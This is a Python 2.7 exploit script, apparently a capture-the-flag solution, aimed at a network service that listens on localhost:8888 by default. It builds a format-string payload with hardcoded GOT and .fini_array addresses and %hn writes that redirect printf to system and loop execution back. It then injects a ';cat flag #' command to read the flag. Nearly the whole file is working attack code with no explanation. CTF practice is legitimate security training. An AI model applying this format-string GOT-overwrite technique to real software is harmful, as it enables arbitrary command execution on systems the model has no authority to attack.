#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib

if len(sys.argv) == 3:
    ADDR = sys.argv[1]
    PORT = int(sys.argv[2])
else:
    ADDR = "localhost"
    PORT = 8888

DBG = False

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DBG:
        sys.stdout.write(buf)
        sys.stdout.flush()
    return buf

ptf_got_low = p32(0x8049a38)
ptf_got_high = p32(0x8049a3a)
fini_low = p32(0x804994c + 4)
fini_high = p32(0x804994c + 6)

# overwrite fini ptr
# jump back to 0x08048614
# to do it again with 
# printf replaced with system

rtil("... ")
buf = "AA"
buf += ptf_got_low
buf += ptf_got_high
buf += fini_low
buf += fini_high
buf += "%33900u%12$hn"
buf += "%33652u%13$hn"
buf += "%15$hn"
buf += "%32233u%14$hn"
buf = buf.ljust(63, 'Z')
s.send(buf)
rtil(":)")

buf = ";"
buf += "cat flag #"
s.send(buf + "\n")
print rtil("}")
